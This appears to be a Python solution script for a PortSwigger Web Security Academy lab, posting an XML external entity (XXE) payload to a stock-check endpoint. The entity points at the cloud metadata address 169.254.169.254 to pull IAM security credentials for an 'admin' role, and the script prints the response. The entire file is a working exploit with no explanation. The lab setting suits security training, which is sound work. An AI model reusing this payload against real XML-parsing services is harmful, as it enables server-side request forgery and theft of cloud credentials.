import requests

DOMAIN = "0a3100f7034723108105d45700dc0067.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

def XXE():
    data = f"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&ext;</productId><storeId>1</storeId></stockCheck>"""

    response = requests.post(f"https://{DOMAIN}/product/stock", headers=HEADERS, data=data)

    print(response.text)


XXE()